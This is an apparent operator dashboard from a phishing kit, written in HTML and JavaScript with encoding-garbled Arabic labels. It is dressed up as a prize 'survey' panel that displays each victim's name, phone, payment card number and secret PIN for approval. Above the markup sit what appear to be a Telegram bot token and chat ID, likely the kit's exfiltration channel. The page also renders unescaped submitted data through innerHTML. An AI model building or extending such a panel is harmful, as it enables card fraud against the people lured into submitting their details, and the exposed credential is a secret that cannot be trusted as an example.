


8431861072:AAH1pbgKEiVTTKOLKjfmf_7F_jSaAw9GR2o



8421252546



g


<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… - Ø§Ù„Ø§Ø³ØªØ¨ÙŠØ§Ù†Ø§Øª</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
        }
        
        body { 
            background: #f5f7fa; 
            padding: 20px; 
            color: #333; 
        }
        
        .container { 
            max-width: 1200px; 
            margin: 0 auto; 
        }
        
        header { 
            background: white; 
            padding: 25px; 
            border-radius: 15px; 
            margin-bottom: 25px; 
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            border-right: 5px solid #667eea;
        }
        
        header h1 { 
            color: #4a5568; 
            margin-bottom: 10px; 
        }
        
        header p { 
            color: #718096; 
        }
        
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); 
            gap: 20px; 
            margin-bottom: 30px; 
        }
        
        .stat-card { 
            background: white; 
            padding: 25px; 
            border-radius: 15px; 
            text-align: center; 
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            transition: transform 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
        }
        
        .stat-card h3 { 
            color: #4a5568; 
            margin-bottom: 15px; 
            font-size: 16px;
        }
        
        .stat-card .number { 
            font-size: 42px; 
            font-weight: bold; 
            margin: 10px 0;
        }
        
        .stat-card.pending { 
            border-top: 4px solid #f59e0b; 
        }
        
        .stat-card.pending .number { 
            color: #f59e0b; 
        }
        
        .stat-card.approved { 
            border-top: 4px solid #10b981; 
        }
        
        .stat-card.approved .number { 
            color: #10b981; 
        }
        
        .stat-card.rejected { 
            border-top: 4px solid #ef4444; 
        }
        
        .stat-card.rejected .number { 
            color: #ef4444; 
        }
        
        .stat-card.total { 
            border-top: 4px solid #667eea; 
        }
        
        .stat-card.total .number { 
            color: #667eea; 
        }
        
        .device-stats {
            background: white;
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 30px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
        }
        
        .device-stats h3 {
            color: #4a5568;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .device-items {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        
        .device-item {
            background: #f8fafc;
            padding: 15px;
            border-radius: 10px;
            flex: 1;
            min-width: 150px;
            text-align: center;
            border-left: 4px solid #8b5cf6;
        }
        
        .device-item .device-name {
            font-weight: bold;
            color: #4c1d95;
            margin-bottom: 5px;
        }
        
        .device-item .device-count {
            font-size: 24px;
            font-weight: bold;
            color: #7c3aed;
        }
        
        .surveys-list { 
            background: white; 
            padding: 25px; 
            border-radius: 15px; 
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
        }
        
        .list-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .list-header h2 {
            color: #4a5568;
        }
        
        .refresh-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .refresh-btn:hover {
            background: #5a67d8;
        }
        
        table { 
            width: 100%; 
            border-collapse: collapse; 
        }
        
        th, td { 
            padding: 15px; 
            text-align: right; 
            border-bottom: 1px solid #e2e8f0; 
        }
        
        th { 
            background: #f8fafc; 
            color: #4a5568;
            font-weight: 600;
        }
        
        tr:hover {
            background: #f8fafc;
        }
        
        .status { 
            padding: 6px 12px; 
            border-radius: 20px; 
            font-size: 13px; 
            font-weight: 500;
        }
        
        .status-pending { 
            background: #fef3c7; 
            color: #92400e; 
        }
        
        .status-approved { 
            background: #d1fae5; 
            color: #065f46; 
        }
        
        .status-rejected { 
            background: #fee2e2; 
            color: #991b1b; 
        }
        
        .actions { 
            display: flex; 
            gap: 8px; 
        }
        
        .actions button { 
            padding: 6px 12px; 
            border: none; 
            border-radius: 6px; 
            cursor: pointer; 
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 5px;
            transition: all 0.3s;
        }
        
        .approve-btn { 
            background: #10b981; 
            color: white; 
        }
        
        .approve-btn:hover {
            background: #0da271;
        }
        
        .reject-btn { 
            background: #ef4444; 
            color: white; 
        }
        
        .reject-btn:hover {
            background: #dc2626;
        }
        
        .view-btn {
            background: #3b82f6;
            color: white;
        }
        
        .view-btn:hover {
            background: #2563eb;
        }
        
        .device-info {
            font-size: 12px;
            color: #718096;
            margin-top: 5px;
        }
        
        .no-data {
            text-align: center;
            padding: 40px;
            color: #a0aec0;
        }
        
        .last-updated {
            text-align: left;
            color: #a0aec0;
            font-size: 14px;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e2e8f0;
        }
        
        @media (max-width: 768px) {
            .stats {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .device-items {
                flex-direction: column;
            }
            
            table {
                display: block;
                overflow-x: auto;
            }
            
            .actions {
                flex-direction: column;
            }
        }
        
        @media (max-width: 480px) {
            .stats {
                grid-template-columns: 1fr;
            }
            
            header, .surveys-list {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1><i class="fas fa-tachometer-alt"></i> Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø§Ù„Ø§Ø³ØªØ¨ÙŠØ§Ù†Ø§Øª</h1>
            <p>Ù…Ø±Ø­Ø¨Ø§Ù‹ Ø¨Ùƒ ÙÙŠ Ù†Ø¸Ø§Ù… Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø§Ø³ØªØ¨ÙŠØ§Ù†Ø§Øª - ØªØ­Ø¯ÙŠØ« ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙƒÙ„ 10 Ø«ÙˆØ§Ù†ÙŠ</p>
        </header>
        
        <div class="stats">
            <div class="stat-card total">
                <h3><i class="fas fa-users"></i> Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒÙŠÙ†</h3>
                <div class="number" id="total">0</div>
                <p>Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ§Øª</p>
            </div>
            <div class="stat-card pending">
                <h3><i class="fas fa-clock"></i> Ù‚ÙŠØ¯ Ø§Ù„Ù…Ø±Ø§Ø¬Ø¹Ø©</h3>
                <div class="number" id="pending">0</div>
                <p>Ø¨Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ù‚Ø¨ÙˆÙ„/Ø§Ù„Ø±ÙØ¶</p>
            </div>
            <div class="stat-card approved">
                <h3><i class="fas fa-check-circle"></i> Ø§Ù„Ù…Ù‚Ø¨ÙˆÙ„Ø©</h3>
                <div class="number" id="approved">0</div>
                <p>Ù…Ø¤Ù‡Ù„Ø© Ù„Ù„ÙÙˆØ²</p>
            </div>
            <div class="stat-card rejected">
                <h3><i class="fas fa-times-circle"></i> Ø§Ù„Ù…Ø±ÙÙˆØ¶Ø©</h3>
                <div class="number" id="rejected">0</div>
                <p>ØºÙŠØ± Ù…Ø¤Ù‡Ù„Ø©</p>
            </div>
        </div>
        
        <div class="device-stats">
            <h3><i class="fas fa-mobile-alt"></i> ØªÙˆØ²ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©</h3>
            <div class="device-items" id="device-stats">
                <!-- ÙŠØªÙ… ØªØ¹Ø¨Ø¦ØªÙ‡ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
            </div>
        </div>
        
        <div class="surveys-list">
            <div class="list-header">
                <h2><i class="fas fa-list"></i> Ø§Ù„Ø§Ø³ØªØ¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø¹Ù„Ù‚Ø©</h2>
                <button onclick="loadSurveys()" class="refresh-btn">
                    <i class="fas fa-sync-alt"></i> ØªØ­Ø¯ÙŠØ«
                </button>
            </div>
            
            <div id="surveys-container">
                <table>
                    <thead>
                        <tr>
                            <th>Ø±Ù‚Ù… Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ©</th>
                            <th>Ø§Ù„Ø§Ø³Ù…</th>
                            <th>Ø§Ù„Ù‡Ø§ØªÙ</th>
                            <th>Ø§Ù„Ø¬Ù‡Ø§Ø²</th>
                            <th>Ø§Ù„ØªØ§Ø±ÙŠØ®</th>
                            <th>Ø§Ù„Ø­Ø§Ù„Ø©</th>
                            <th>Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª</th>
                        </tr>
                    </thead>
                    <tbody id="surveysBody">
                        <!-- ÙŠØªÙ… ØªØ¹Ø¨Ø¦Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù‡Ù†Ø§ -->
                    </tbody>
                </table>
                
                <div id="no-data" class="no-data" style="display: none;">
                    <i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px;"></i>
                    <h3>Ù„Ø§ ØªÙˆØ¬Ø¯ Ø§Ø³ØªØ¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹Ù„Ù‚Ø©</h3>
                    <p>Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø§Ø³ØªØ¨ÙŠØ§Ù†Ø§Øª ØªÙ…Øª Ù…Ø±Ø§Ø¬Ø¹ØªÙ‡Ø§</p>
                </div>
            </div>
            
            <div class="last-updated">
                <i class="fas fa-clock"></i> Ø¢Ø®Ø± ØªØ­Ø¯ÙŠØ«: <span id="last-updated">--:--:--</span>
            </div>
        </div>
    </div>

    <!-- Ù†Ø§ÙØ°Ø© Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„ -->
    <div id="details-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; align-items: center; justify-content: center;">
        <div style="background: white; padding: 30px; border-radius: 15px; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="color: #4a5568;"><i class="fas fa-info-circle"></i> ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ©</h3>
                <button onclick="closeModal()" style="background: none; border: none; font-size: 24px; cursor: pointer; color: #718096;">&times;</button>
            </div>
            <div id="modal-content"></div>
            <div style="margin-top: 20px; display: flex; gap: 10px; justify-content: flex-end;">
                <button onclick="approveSelected()" style="background: #10b981; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer;">
                    <i class="fas fa-check"></i> Ù‚Ø¨ÙˆÙ„
                </button>
                <button onclick="rejectSelected()" style="background: #ef4444; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer;">
                    <i class="fas fa-times"></i> Ø±ÙØ¶
                </button>
                <button onclick="closeModal()" style="background: #718096; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer;">
                    Ø¥ØºÙ„Ø§Ù‚
                </button>
            </div>
        </div>
    </div>

    <script>
        let selectedSurveyId = null;
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† localStorage
        function loadSurveys() {
            try {
                const surveys = JSON.parse(localStorage.getItem('participants') || '[]');
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
                document.getElementById('total').textContent = surveys.length;
                
                const pending = surveys.filter(s => s.status === 'pending').length;
                const approved = surveys.filter(s => s.status === 'approved').length;
                const rejected = surveys.filter(s => s.status === 'rejected').length;
                
                document.getElementById('pending').textContent = pending;
                document.getElementById('approved').textContent = approved;
                document.getElementById('rejected').textContent = rejected;
                
                // ØªØ­Ø¯ÙŠØ« Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©
                updateDeviceStats(surveys);
                
                // Ø¹Ø±Ø¶ Ø§Ù„Ø¬Ø¯ÙˆÙ„
                const tbody = document.getElementById('surveysBody');
                const noDataDiv = document.getElementById('no-data');
                
                if (pending === 0) {
                    tbody.innerHTML = '';
                    noDataDiv.style.display = 'block';
                    document.querySelector('table').style.display = 'none';
                } else {
                    document.querySelector('table').style.display = 'table';
                    noDataDiv.style.display = 'none';
                    tbody.innerHTML = '';
                    
                    const pendingSurveys = surveys.filter(s => s.status === 'pending');
                    
                    pendingSurveys.forEach(survey => {
                        const deviceInfo = survey.deviceInfo || {};
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td><strong>${survey.id}</strong></td>
                            <td>${survey.name}</td>
                            <td dir="ltr">${survey.phone}</td>
                            <td>
                                ${deviceInfo.type || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
                                <div class="device-info">
                                    ${deviceInfo.browser || ''} ${deviceInfo.os ? ' | ' + deviceInfo.os : ''}
                                </div>
                            </td>
                            <td>${survey.date}</td>
                            <td><span class="status status-pending">Ù‚ÙŠØ¯ Ø§Ù„Ù…Ø±Ø§Ø¬Ø¹Ø©</span></td>
                            <td class="actions">
                                <button class="view-btn" onclick="viewDetails('${survey.id}')">
                                    <i class="fas fa-eye"></i> Ø¹Ø±Ø¶
                                </button>
                                <button class="approve-btn" onclick="approveSurvey('${survey.id}')">
                                    <i class="fas fa-check"></i> Ù‚Ø¨ÙˆÙ„
                                </button>
                                <button class="reject-btn" onclick="rejectSurvey('${survey.id}')">
                                    <i class="fas fa-times"></i> Ø±ÙØ¶
                                </button>
                            </td>
                        `;
                        tbody.appendChild(row);
                    });
                }
                
                // ØªØ­Ø¯ÙŠØ« ÙˆÙ‚Øª Ø§Ù„ØªØ­Ø¯ÙŠØ«
                document.getElementById('last-updated').textContent = new Date().toLocaleTimeString('ar-SA');
                
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', error);
                showMessage('Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'error');
            }
        }
        
        // ØªØ­Ø¯ÙŠØ« Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©
        function updateDeviceStats(surveys) {
            const deviceStats = {};
            
            surveys.forEach(survey => {
                const deviceType = survey.deviceInfo?.type || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
                deviceStats[deviceType] = (deviceStats[deviceType] || 0) + 1;
            });
            
            const deviceContainer = document.getElementById('device-stats');
            deviceContainer.innerHTML = '';
            
            Object.entries(deviceStats).forEach(([type, count]) => {
                const icon = type === 'ÙƒÙ…Ø¨ÙŠÙˆØªØ±' ? 'ğŸ’»' : type === 'ØªØ§Ø¨Ù„Øª' ? 'ğŸ“Ÿ' : 'ğŸ“±';
                const deviceItem = document.createElement('div');
                deviceItem.className = 'device-item';
                deviceItem.innerHTML = `
                    <div class="device-name">${icon} ${type}</div>
                    <div class="device-count">${count}</div>
                    <small>${Math.round((count / surveys.length) * 100)}% Ù…Ù† Ø§Ù„Ù…Ø´Ø§Ø±ÙƒÙŠÙ†</small>
                `;
                deviceContainer.appendChild(deviceItem);
            });
        }
        
        // Ø¹Ø±Ø¶ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø§Ø³ØªØ¨ÙŠØ§Ù†
        function viewDetails(surveyId) {
            const surveys = JSON.parse(localStorage.getItem('participants') || '[]');
            const survey = surveys.find(s => s.id === surveyId);
            
            if (!survey) {
                showMessage('Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„Ø§Ø³ØªØ¨ÙŠØ§Ù†', 'error');
                return;
            }
            
            selectedSurveyId = surveyId;
            
            const deviceInfo = survey.deviceInfo || {};
            const modalContent = document.getElementById('modal-content');
            
            modalContent.innerHTML = `
                <div style="background: #f8fafc; padding: 20px; border-radius: 10px; margin-bottom: 15px;">
                    <h4 style="color: #4a5568; margin-bottom: 15px; border-bottom: 2px solid #e2e8f0; padding-bottom: 10px;">
                        <i class="fas fa-user"></i> Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø®ØµÙŠØ©
                    </h4>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                        <div>
                            <label style="color: #718096; font-size: 14px;">Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„</label>
                            <p style="font-weight: bold; margin-top: 5px;">${survey.name}</p>
                        </div>
                        <div>
                            <label style="color: #718096; font-size: 14px;">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>
                            <p dir="ltr" style="font-weight: bold; margin-top: 5px;">${survey.phone}</p>
                        </div>
                        <div>
                            <label style="color: #718096; font-size: 14px;">Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</label>
                            <p dir="ltr" style="font-weight: bold; margin-top: 5px;">${survey.card}</p>
                        </div>
                        <div>
                            <label style="color: #718096; font-size: 14px;">Ø§Ù„Ø±Ù…Ø² Ø§Ù„Ø³Ø±ÙŠ</label>
                            <p style="font-weight: bold; margin-top: 5px; font-family: monospace;">${survey.code}</p>
                        </div>
                    </div>
                </div>
                
                <div style="background: #f0f9ff; padding: 20px; border-radius: 10px; margin-bottom: 15px;">
                    <h4 style="color: #4a5568; margin-bottom: 15px; border-bottom: 2px solid #bae6fd; padding-bottom: 10px;">
                        <i class="fas fa-mobile-alt"></i> Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
                    </h4>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                        <div>
                            <label style="color: #718096; font-size: 14px;">Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²</label>
                            <p style="font-weight: bold; margin-top: 5px;">${deviceInfo.type || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</p>
                        </div>
                        <div>
                            <label style="color: #718096; font-size: 14px;">Ø§Ù„Ù…ØªØµÙØ­</label>
                            <p style="font-weight: bold; margin-top: 5px;">${deviceInfo.browser || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</p>
                        </div>
                        <div>
                            <label style="color: #718096; font-size: 14px;">Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„</label>
                            <p style="font-weight: bold; margin-top: 5px;">${deviceInfo.os || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}</p>
                        </div>
                        <div>
                            <label style="color: #718096; font-size: 14px;">Ù…Ù‚Ø§Ø³ Ø§Ù„Ø´Ø§Ø´Ø©</label>
                            <p style="font-weight: bold; margin-top: 5px;">${deviceInfo.screenWidth || 0}Ã—${deviceInfo.screenHeight || 0}</p>
                        </div>
                    </div>
                </div>
                
                <div style="background: #f7fee7; padding: 20px; border-radius: 10px;">
                    <h4 style="color: #4a5568; margin-bottom: 15px; border-bottom: 2px solid #d9f99d; padding-bottom: 10px;">
                        <i class="fas fa-info-circle"></i> Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©
                    </h4>
                    <div>
                        <label style="color: #718096; font-size: 14px;">Ø±Ù‚Ù… Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ©</label>
                        <p style="font-weight: bold; margin-top: 5px; font-family: monospace;">${survey.id}</p>
                    </div>
                    <div style="margin-top: 15px;">
                        <label style="color: #718096; font-size: 14px;">ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ©</label>
                        <p style="font-weight: bold; margin-top: 5px;">${survey.date}</p>
                    </div>
                </div>
            `;
            
            document.getElementById('details-modal').style.display = 'flex';
        }
        
        // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ù†Ø§ÙØ°Ø©
        function closeModal() {
            document.getElementById('details-modal').style.display = 'none';
            selectedSurveyId = null;
        }
        
        // Ù‚Ø¨ÙˆÙ„ Ø§Ø³ØªØ¨ÙŠØ§Ù†
        function approveSurvey(id) {
            if (!confirm(`Ù‡Ù„ ØªØ±ÙŠØ¯ Ù‚Ø¨ÙˆÙ„ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© ${id}ØŸ`)) return;
            
            const surveys = JSON.parse(localStorage.getItem('participants') || '[]');
            const index = surveys.findIndex(s => s.id === id);
            
            if (index !== -1) {
                surveys[index].status = 'approved';
                surveys[index].reviewed_by = 'Ø§Ù„Ù…Ø¯ÙŠØ± (ÙˆÙŠØ¨)';
                surveys[index].reviewed_at = new Date().toLocaleString('ar-SA');
                localStorage.setItem('participants', JSON.stringify(surveys));
                
                showMessage(`âœ… ØªÙ… Ù‚Ø¨ÙˆÙ„ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© ${id}`);
                loadSurveys();
                closeModal();
            }
        }
        
        // Ø±ÙØ¶ Ø§Ø³ØªØ¨ÙŠØ§Ù†
        function rejectSurvey(id) {
            if (!confirm(`Ù‡Ù„ ØªØ±ÙŠØ¯ Ø±ÙØ¶ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© ${id}ØŸ`)) return;
            
            const surveys = JSON.parse(localStorage.getItem('participants') || '[]');
            const index = surveys.findIndex(s => s.id === id);
            
            if (index !== -1) {
                surveys[index].status = 'rejected';
                surveys[index].reviewed_by = 'Ø§Ù„Ù…Ø¯ÙŠØ± (ÙˆÙŠØ¨)';
                surveys[index].reviewed_at = new Date().toLocaleString('ar-SA');
                localStorage.setItem('participants', JSON.stringify(surveys));
                
                showMessage(`âŒ ØªÙ… Ø±ÙØ¶ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© ${id}`);
                loadSurveys();
                closeModal();
            }
        }
        
        // Ù‚Ø¨ÙˆÙ„ Ù…Ù† Ø§Ù„Ù†Ø§ÙØ°Ø©
        function approveSelected() {
            if (selectedSurveyId) {
                approveSurvey(selectedSurveyId);
            }
        }
        
        // Ø±ÙØ¶ Ù…Ù† Ø§Ù„Ù†Ø§ÙØ°Ø©
        function rejectSelected() {
            if (selectedSurveyId) {
                rejectSurvey(selectedSurveyId);
            }
        }
        
        // Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø©
        function showMessage(text, type = 'success') {
            // Ø¥Ù†Ø´Ø§Ø¡ Ø¹Ù†ØµØ± Ø§Ù„Ø±Ø³Ø§Ù„Ø©
            const messageEl = document.createElement('div');
            messageEl.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: ${type === 'success' ? '#10b981' : '#ef4444'};
                color: white;
                padding: 15px 20px;
                border-radius: 10px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
                z-index: 1001;
                animation: slideIn 0.3s;
            `;
            messageEl.textContent = text;
            
            document.body.appendChild(messageEl);
            
            setTimeout(() => {
                messageEl.style.animation = 'slideOut 0.3s';
                setTimeout(() => {
                    document.body.removeChild(messageEl);
                }, 300);
            }, 3000);
        }
        
        // ØªØ­Ø¯ÙŠØ« ØªÙ„Ù‚Ø§Ø¦ÙŠ ÙƒÙ„ 10 Ø«ÙˆØ§Ù†ÙŠ
        setInterval(loadSurveys, 10000);
        
        // ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ù†Ø¯ Ø§Ù„Ø¨Ø¯Ø¡
        document.addEventListener('DOMContentLoaded', loadSurveys);
        
        // Ø¥Ø¶Ø§ÙØ© Ø£Ù†ÙŠÙ…ÙŠØ´Ù† CSS
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>